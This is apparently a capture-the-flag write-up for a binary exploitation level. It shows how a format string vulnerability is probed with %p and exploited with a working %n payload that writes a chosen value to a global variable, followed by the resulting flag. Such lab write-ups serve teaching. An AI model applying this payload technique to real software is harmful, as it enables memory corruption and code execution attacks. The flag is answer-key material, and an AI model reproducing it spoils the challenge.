everything in the last challenge applies to this one but with a slight difference.

the `printf` function is called in a sub function which means that if we want to jump to the desired address we have to take in consideration that there is another stack frame from which the print statement is called:

```
[lower addresses]
+-------------------+
|                   | 
|                   | 
|  printf call      | <- p func stack frame
|                   | 
|                   |
+-------------------+
|                   |
|                   |
|  addr we want to  |
|   reach           | <- n func stack frame
|                   |
|                   | 
+-------------------+
|                   | <- main func stack frame
+-------------------+
[higher addresses]
```

```bash
➜  level4 git:(main) ✗ ./level4 
AAAA%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
AAAA0xf7eebf94 0xffb3e6e0 0xf7eb1000 0xffb3e774 0xf7f0fb80 0xffb3e6a8 0x804848d 0xffb3e4a0 0x200 0xf7eb1620 0x380 0x41414141 <- "the address we want is in the 12th position" 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```

the address of the global variable `m` this time is `0x8049810` and the value we want to put there is `0x1025544`

```bash
python -c 'print "\x10\x98\x04\x08%16930112x%12$n"' | ./level4
# 1 million spaces later... hihi
                                                                         b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

and there you go.